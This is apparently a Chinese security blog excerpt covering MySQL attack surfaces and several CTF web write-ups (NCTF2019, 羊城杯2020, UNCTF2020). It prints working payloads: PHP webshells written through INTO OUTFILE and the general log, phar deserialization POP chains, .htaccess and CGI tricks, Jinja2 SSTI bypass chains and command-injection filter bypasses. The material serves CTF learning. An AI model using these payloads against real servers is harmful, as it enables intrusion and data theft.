发现这个漏洞的原作者给出了POC，但是LoRexxar文中提到这个POC并没有适配所有的情况，部分mysql客户端会在登陆成功之后发送ping包，如果没有回复就会断开连接，也有部分mysql client端对greeting包有较强的校验。 这里就拿网上更改之后的POC来拿做实验：https://github.com/allyshka/Rogue-MySql-Server 暂停MySQL Server服务 1service mysqld stop 运行恶意MySQL服务器脚本 1python rogue_mysql_server.py 客户端访问MySQL服务器 1mysql -h xxx -u root -p 查看mysql.log文件 LoRexxar文章中还接着提到了关于这个漏洞的进一步利用，比如说读取配置文件，Phar反序列化等等。 其中Phar反序列化这个还挺有意思的，首先生成一个phar： 12345678910111213141516171819&lt;?phpclass A &#123; public $s = &#x27;&#x27;; public function __wakeup () &#123; echo &quot;pwned!!&quot;; &#125;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a &quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new A();$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 然后用test.php模拟一次查询 12345678910111213&lt;?phpclass A &#123; public $s = &#x27;&#x27;; public function __wakeup () &#123; echo &quot;pwned!!&quot;; &#125;&#125;$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &#x27;&#123;evil_mysql_ip&#125;&#x27;, &#x27;root&#x27;, &#x27;123456&#x27;, &#x27;test&#x27;, 3667);$p = mysqli_query($m, &#x27;select 1;&#x27;); 伪造的evil mysql server中让mysql client去做load file local查询，读取本地的phar文件。 0x02 攻击面——利用SSRF攻击MySQL 适用范围：全版本 MySQL/MariaDB Server 条件：拥有空密码用户 之前在总结SSRF漏洞的时候提到过利用SSRF攻击Redis和FastCGI，没写过关于MySQL。 同样的，利用SSRF攻击MySQL也需要了解MySQL的完整交互协议，并且伪造客户端，通过SSRF进行交互连接。 参考文章同样来自于一篇Seebug上的文章：https://paper.seebug.org/510/ 这个利用条件比较苛刻，可以归属于未授权访问，因为非交互模式下登录并操作MySQL只能无需密码认证。 关于MySQL的认证过程和报文格式我就不多叙述，这里直接演示一下过程，以腾讯云主机MySQL80作为实验机，本地登录。 首先需要新建一个MySQL用户，并且密码为空，使用root登录MySQL后执行如下命令： 123CREATE USER &#39; usernopass&#39;@&#39;localhost&#39;;GRANT USAGE ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;GRANT ALL ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;; 有两个办法，一种是用gopherus工具直接生成payload。 另外一种是自己抓包生成原始数据流，再转换成gopher协议的格式。 再利用脚本转换一下： 12345678def result(s): a=[s[i:i+2] for i in xrange(0,len(s),2)] return &quot;curl gopher://127.0.0.1:3306/_%&quot; + &quot;%&quot;.join(a)if __name__ == &#x27;__main__&#x27;: import sys s=sys.argv[1] print result(s) 但是这两种办法我都没能复现出来，可能是看不到执行的结果。 接下来，可以使用SSRF攻击MySQL，那么就可以利用MySQL写入webshell，但是要求secure_file_priv不能为空。 0x03攻击面——MySQL服务端文件读写 这个就比较简单了，但是对要求服务端配置可读写目录和正确的用户权限。 读文件： 1SELECT LOAD_FILE (&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&#39;) AS Result; 123create database test;CREATE TABLE test (id TEXT, content TEXT);load data infile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot; into table test.test FIELDS TERMINATED BY &#39;\\n\\r&#39; ; 写文件： 1select group_concat (id) from test INTO OUTFILE &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaaa&quot;; 0x04提权 提权就不写那么详细了，主要是参考m00nback的文章：https://www.m00nback.xyz/2020/03/30/mysql提权总结/ CVE-2012-2122 该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。 影响版本： MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not. MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not. MSF有相关利用模块：use auxiliary/scanner/mysql/mysql_authbypass_hashdump 写shell outfile写shell 跟上面描述的差不多，关键还是secure_file_priv这个参数，而且是只读参数，必须更改MySQL的配置文件再重启MySQL服务。 来个🌰 1select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; into outfile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot;; 日志写shell 前提是知道MySQL root用户密码，第一步开启日志记录： 1set global general_log&#x3D;&#39;on&#39;; 日志文件导出到指定目录： 1set global general_log_file&#x3D;&quot;&#x2F;tmp&#x2F;shell.php&quot;; 记录SQL语句写shell： 1select &quot;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&quot;; 关闭记录： 1set global general_log&#x3D;&#39;off&#39;; UDF提权 大马提权：https://github.com/echohun/tools/blob/master/大马/udf.php 手工提权：https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql https://cooltige.com/2020/06/02/Mysql-Udf提权/ https://xz.aliyun.com/t/2199","tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"NCTF2019-PharMatchesEverything","date":"2020-12-10T14:54:33.000Z","path":"Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything/","text":"NCTF2019 Phar matches everything 去年NCTF2019的题目，可以说是考到了PHP大部分的知识点，值得一做。 原题目提示是通过vim的备份文件下载源码，但是BUU上的环境好像没有备份文件，只能从GitHub上下载catchmime.php和upload.php两个文件的源代码， 首先是upload.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?php$target_dir = &quot;uploads/&quot;;$uploadOk = 1;$imageFileType=substr($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],strrpos($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;],&#x27;.&#x27;)+1,strlen($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]));$file_name = md5(time());$file_name =substr($file_name, 0, 10).&quot;.&quot;.$imageFileType;$target_file=$target_dir.$file_name; $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]); if($check !== false) &#123; echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; $uploadOk = 1; &#125; else &#123; echo &quot;File is not an image.&quot;; $uploadOk = 0; &#125;if (file_exists($target_file)) &#123; echo &quot;Sorry, file already exists.&quot;; $uploadOk = 0;&#125;if ($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;] &gt; 500000) &#123; echo &quot;Sorry, your file is too large.&quot;; $uploadOk = 0;&#125;if($imageFileType !== &quot;jpg&quot; &amp;&amp; $imageFileType !== &quot;png&quot; &amp;&amp; $imageFileType !== &quot;gif&quot; &amp;&amp; $imageFileType !== &quot;jpeg&quot; ) &#123; echo &quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;; $uploadOk = 0;&#125;if ($uploadOk == 0) &#123; echo &quot;Sorry, your file was not uploaded.&quot;;&#125; else &#123; if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) &#123; echo &quot;The file $file_name has been uploaded to ./uploads/&quot;; &#125; else &#123; echo &quot;Sorry, there was an error uploading your file.&quot;; &#125;&#125;?&gt; 单独看这个upload.php使用了白名单限制，只能上传图片后缀的文件，应该要结合其他的功能点一起利用。 再看catchmime.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Easytest&#123; protected $test; public function funny_get()&#123; return $this-&gt;test; &#125;&#125;class Main &#123; public $url; public function curl($url)&#123; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; &#125; public function __destruct()&#123; $this_is_a_easy_test=unserialize($_GET[&#x27;careful&#x27;]); if($this_is_a_easy_test-&gt;funny_get() === &#x27;1&#x27;)&#123; echo $this-&gt;curl($this-&gt;url); &#125; &#125; &#125;if(isset($_POST[&quot;submit&quot;])) &#123; $check = getimagesize($_POST[&#x27;name&#x27;]); if($check !== false) &#123; echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; &#125; else &#123; echo &quot;File is not an image.&quot;; &#125;&#125;?&gt; 这个文件中存在两个和功能不相干的类Main和Easytest。 getimagesize会触发Phar反序列化，然后在careful参数触发Easy_test类的反序列化，修改test参数为1。 12345678910111213141516171819202122&lt;?phpclass Easytest&#123; protected $test = &#x27;1&#x27;;&#125;class Main&#123; public $url = &#x27;file:///etc/passwd&#x27;;&#125;$a = new Easytest();echo urlencode(serialize($a));$b = new Main();ini_set(&#x27;phar.readonly&#x27;,&#x27;Off&#x27;);### POP链构造@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();//开始缓冲Phar写操作$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($b);//将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算$phar-&gt;stopBuffering(); 然后payload打过去 读了一圈文件，没找到flag，又不能执行命令，尝试去读/etc/hosts（或者/etc/net/arp) 读到了一个内网IP地址10.247.100.9。结果BUU上面我试了好几个C段地址之后，10.247.100.11这个地址终于返回了PHP-FPM。 接着就用SSRF打FPM，网上都是用P牛的脚本去构造， 有open_basedir限制，绕过一下： 1&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"羊城杯2020-Web-Writeups","date":"2020-12-10T14:53:59.000Z","path":"Web_security/ctf_writeup/28.羊城杯2020-Web-Writeups/","text":"羊城杯2020 Web Writeup 当时没时间打，现在题目在GitHub上开源了，随便看看。 easycon 蚁剑连接一句话，下载bbbbbbbbb.txt文件，是一个少了头部分的base64编码的图片，加上头再转码 easyser 这题目说实在的，提示地太隐晦了，用不安全的协议读取ser.php文件，Fuzz半天发现是用http://127.0.0.1/star1.php读取源码。 ser.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phperror_reporting(0);if ( $_SERVER[&#x27;REMOTE_ADDR&#x27;] == &quot;127.0.0.1&quot; ) &#123; highlight_file(__FILE__);&#125; $flag=&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;;class GWHT&#123; public $hero; public function __construct()&#123; $this-&gt;hero = new Yasuo; &#125; public function __toString()&#123; if (isset($this-&gt;hero))&#123; return $this-&gt;hero-&gt;hasaki(); &#125;else&#123; return &quot;You don&#x27;t look very happy&quot;; &#125; &#125;&#125;class Yongen&#123; //flag.php public $file; public $text; public function __construct($file=&#x27;&#x27;,$text=&#x27;&#x27;) &#123; $this -&gt; file = $file; $this -&gt; text = $text; &#125; public function hasaki()&#123; $d = &#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;; $a= $d. $this-&gt;text; @file_put_contents($this-&gt; file,$a); &#125;&#125;class Yasuo&#123; public function hasaki()&#123; return &quot;I&#x27;m the best happy windy man&quot;; &#125;&#125;/*$c=$_GET[&#x27;c&#x27;];echo $x=unserialize($c);*/ POP链构造+绕过exit 1234567891011121314&lt;?phpclass GWHT&#123; public $hero;&#125;class Yongen&#123; //flag.php public $file = &quot;php://filter/convert.base64-decode/resource=aaa.php&quot;; public $text = &quot;aaaPD9waHAgZXZhbCgkX1BPU1Rbc10pOyAgPz4=&quot;;&#125;$a = new GWHT;$a-&gt;hero = new Yongen;echo urlencode(serialize($a)); easyphp 代码审计 123456789101112131415161718192021222324252627282930313233&lt;?php $files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123; highlight_file(__FILE__); die(); &#125; $content = $_GET[&#x27;content&#x27;]; if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123; echo &quot;Hacker&quot;; die(); &#125; $filename = $_GET[&#x27;filename&#x27;]; if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123; echo &quot;Hacker&quot;; die(); &#125; $files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; file_put_contents($filename, $content . &quot;\\nHello, world&quot;);?&gt; 第一反应就是覆盖掉index.php，但是好像没有写入权限，那大概率应该就是用.htaccess这个文件做文章了。 第一种思路，向.htaccess文件写入shell，并且用auto_prepend_file包含.htaccess，但是file关键字被ban了，可以用换行绕过，结尾要用\\处理content中的\\n。 1?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\\%0ae%20.htaccess%0a%23&lt;? php%20system(&#39;cat%20&#x2F;fl[a]g&#39;);?&gt;\\ 第二种思路，依然是利用.htaccess文件特性，不过这次是通过设置php_value来设置preg_macth正则回溯次数 12php_value pcre.backtrack_limit 0php_value pcre.jit 0 先写入.htaccess 1?content&#x3D;php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\\&amp;f ilename&#x3D;.htaccess 再直接通过php://filter伪协议写入一句话： 1?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess&amp;content&#x3D;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs&#x2F;Plw&amp;1&#x3D;phpinfo(); easyphp2 robots.txt提示有check.php 伪协议读取源码： https://www.php.net/manual/zh/filters.convert.php 1http:&#x2F;&#x2F;localhost:8080&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;GWHT.php GWHT.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;count is here&lt;/title&gt; &lt;style&gt; html, body &#123; overflow: none; max-height: 100vh; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body style=&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;&gt;&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt; &lt;?php ini_set(&#x27;max_execution_time&#x27;, 5); if ($_COOKIE[&#x27;pass&#x27;] !== getenv(&#x27;PASS&#x27;)) &#123; setcookie(&#x27;pass&#x27;, &#x27;PASS&#x27;); die(&#x27;&lt;h2&gt;&#x27;.&#x27;&lt;hacker&gt;&#x27;.&#x27;&lt;h2&gt;&#x27;.&#x27;&lt;br&gt;&#x27;.&#x27;&lt;h1&gt;&#x27;.&#x27;404&#x27;.&#x27;&lt;h1&gt;&#x27;.&#x27;&lt;br&gt;&#x27;.&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;.&#x27;23333&#x27;); &#125; ?&gt; &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt; &lt;form&gt; &lt;input type=&quot;hidden&quot; value=&quot;GWHT.php&quot; name=&quot;file&quot;&gt; &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;?php if (isset($_GET[&quot;count&quot;])) &#123; $count = $_GET[&quot;count&quot;]; if(preg_match(&#x27;/;|base64|rot13|base32|base16|&lt;\\?php|#/i&#x27;, $count))&#123; die(&#x27;hacker!&#x27;); &#125; echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#x27;printf \\&#x27;&#x27; . $count . &#x27;\\&#x27; | wc -c&#x27;) . &quot;&lt;/h2&gt;&quot;; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; check.php 123456&lt;?php$pass = &quot;GWHT&quot;;// Cookie password.echo &quot;Here is nothing, isn&#x27;t it ?&quot;;header(&#x27;Location: /&#x27;); 读到Cookie是GWHT，接下来就是命令执行exec('printf \\'' . $count . '\\' | wc -c') exec命令无回显，可以直接写入shell 11&#39;| echo &quot;&lt;?&#x3D;eval(\\$_POST[&#39;shell&#39;])?&gt;&quot; &gt; shell.php ||&#39; 另外base64还有一种绕过方式：%6%32，%32是2，拼接成%62就是字母b了。 BlackCat 首页提示你听歌，把MP3下载到本地，用010 Editor打开，文件末尾隐藏着PHP代码 copy下来放到sublime中审计： 123456789101112131415161718&lt;?phpif(empty($_POST[&#x27;Black-Cat-Sheriff&#x27;]) || empty($_POST[&#x27;One-ear&#x27;]))&#123; die(&#x27;Ë­£¡¾¹¸Ò²ÈÎÒÒ»Ö»¶úµÄÎ²°Í£¡&#x27;);&#125;$clandestine = getenv(&quot;clandestine&quot;);if(isset($_POST[&#x27;White-cat-monitor&#x27;])) $clandestine = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;White-cat-monitor&#x27;], $clandestine);$hh = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;One-ear&#x27;], $clandestine);if($hh !== $_POST[&#x27;Black-Cat-Sheriff&#x27;])&#123; die(&#x27;ÓÐÒâÃé×¼£¬ÎÞÒâ»÷·¢£¬ÄãµÄÃÎÏë¾ÍÊÇÄãÒªÃé×¼µÄÄ¿±ê¡£ÏàÐÅ×Ô¼º£¬Äã¾ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄµÄ×Óµ¯¡£&#x27;);&#125;echo exec(&quot;nc&quot;.$_POST[&#x27;One-ear&#x27;]); 中文存在乱码，不过不影响审计过程。hash_mac在官方文档中的第一个Note提到了一个trick： 第二个参数如果是数组的话，那么这个函数会生成一个warning，并且返回NULL，那么相当于$clandetine参数可控。payload： 1White-cat-monitor[]&#x3D;1&amp;One-ear&#x3D;;cat flag.php&amp;Black-CatSheriff&#x3D;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"UNCTF2020-Web-Writeup","date":"2020-11-19T05:41:51.000Z","path":"Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup/","text":"UNCTF2020 Web wp easyssrf [solved] 算是签到题，比较easy 1unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag easyflask [solved] Fuzz了一下，发现过滤挺多东西的。 只能用管道+join的方法 1&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_ 等价于().__class__ 1&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base 等价于().__class__.__base__ 1&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses ().__class__.__base__.subclasses() 1&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)&#125; ().__class__.base__.subclasses().pop(475) click.utils.LazyFile 1&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;etc&#x2F;passwd 但是不知道flag在哪，所以还是要执行系统命令 1&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)&#125;&#125; 选取的模块&lt;class '_frozen_importlib._DummyModuleLock'&gt; 1&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)|attr((request.args.usc*2,request.args.init,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.globals,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.builtins,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.import,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;init&#x3D;init&amp;globals&#x3D;globals&amp;builtins&#x3D;builtins&amp;import&#x3D;import ().__class__.base__.subclasses().pop(64).__init__.__globals__.__import__ 还是没能搞出来 最后还是通过读文件的方式，首先尝试proc/self/cwd和/proc/self/environ，直接返回500，应该是权限不够，再尝试读取/proc/self/cmdline，显示项目是在/app下面，再看/app/app.py发现可以成功读取源码，那就猜了一波flag应该在这个路径下。 1&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;app&#x2F;flag.txt 参考： https://www.jianshu.com/p/a736e39c3510 https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#flask-改 https://blog.csdn.net/weixin_43536759/article/details/105066445 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---filter-bypass 赛后看预期解我好像做的太麻烦了。 1&#123;&#123;((session|attr(request.headers.x))|attr(request.headers.x1)).get(request.headers.x2).get(request.headers.x3)(request.headers.x4).read()&#125;&#125; header的内容： 12345x: __init__x1: __globals__x2: __builtins__x3: openx4: app.py(flag.txt) easyunserialize [solved] 反序列化字符逃逸 Payload: 1challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125; babyeval [solved] 命令执行可以直接包含文件 1?a&#x3D;include&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;; easyfind [solved] 一开始不给hint都没什么思路，后来放了一个hint： 1if(!(is_file($name)===false))&#123;flag&#125;else&#123;no flag&#125; is_file函数接收一个数组的时候回返回Null 1?name[]&#x3D;0 easy_upload [solved] 检查文件名后缀、文件类型，过滤了perl|pyth|ph|auto|curl|base|\\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet，不检查是否有图片头。 .htaccess文件名是可以上传的，用换行绕过： 12345AddHandler p\\ph5-script .txtp\\hp_value au\\to_append_file &#x2F;flag 然后在随便上传一个txt文件，访问对应路径即可。 然后我写wp的时候发现，这道题目过滤被改了，增加了一个\\，所以上面的这种换行绕过就没办法bypass了。 来学一个新姿势，上传.htaccess，开启cgi支持，上传cgi脚本，执行cgi脚本，输出flag。 12Options +ExecCGIAddHandler cgi-script .xx 再上传cgi文件，这个文件必须要在Linux/macOS环境下编写，使用vim就行。 12345#!&#x2F;bin&#x2F;bashecho &quot;Content-Type: text&#x2F;plain&quot;echo &quot;&quot;cat &#x2F;flagexit 然后上传的时候最好也要直接上传文件，抓包修改文件类型，最后再放包，不然可能会出现500的错误。 UN’s_online_tools [solved] 命令执行绕过的题目，当前目录下只有index.php，用sort读取源代码，过滤空格和$，用%09来绕过。 从源码中可以看到禁用了/(;|'| |&gt;|]|&amp;| |\\\\$|\\\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\\*|\\&#123;)/i 用ls命令看到flag在根目录下，base64编码一下 127.0.0.1|echo%09Y2F0IC9mbGFn|base64%09-d|sh easyphp PHP代码审计 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?php$adminPassword = &#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;;if (!function_exists(&#x27;fuxkSQL&#x27;)) &#123; function fuxkSQL($iText) &#123; $oText = $iText; $oText = str_replace(&#x27;\\\\\\\\&#x27;, &#x27;\\\\&#x27;, $oText); $oText = str_replace(&#x27;\\&quot;&#x27;, &#x27;&quot;&#x27;, $oText); $oText = str_replace(&quot;\\&#x27;&quot;, &quot;&#x27;&quot;, $oText); $oText = str_replace(&quot;&#x27;&quot;, &quot;&#x27;&#x27;&quot;, $oText); return $oText; &#125;&#125;if (!function_exists(&#x27;getVars&#x27;)) &#123; function getVars() &#123; $totals = array_merge($_GET, $_POST); if (count($_GET)) &#123; foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; if (is_array($value)) &#123; $temp_array = array(); foreach ($value as $key2 =&gt; $value2) &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $temp_array[$key2] = fuxkSQL(trim($value2)); &#125; else &#123; $temp_array[$key2] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value2)))); &#125; &#125; $&#123;$key&#125; = $_GET[$key] = $temp_array; &#125; else &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $&#123;$key&#125; = fuxkSQL(trim($value)); &#125; else &#123; $&#123;$key&#125; = $_GET[$key] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value)))); &#125; &#125; &#125; &#125; &#125;&#125;getVars();if (isset($source)) &#123; highlight_file(__FILE__);&#125;//只有admin才能设置环境变量if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123; echo &#x27;you can set config variables!!&#x27; . &#x27;&lt;/br&gt;&#x27;; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(&quot;\\$$key&quot; . &#x27;=&quot;&#x27; . $GLOBALS[$key] . &#x27;&quot;;&#x27;); &#125; &#125;&#125; else &#123; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key)) &#123; echo ($GLOBALS[$key]) . &#x27;&lt;/br&gt;&#x27;; &#125; &#125;&#125; 这道题考点是变量覆盖，弱类型和PHP复杂变量的解析。做出了前两个考点，倒在了第三个考点，没想到用复杂变量。 第一关 123foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;;&#125; $&#123;$key&#125;=$value可以导致变量覆盖，也就是说我们将$password覆盖为任意值，然后将$adminPassword覆盖为其md5值。 payload： 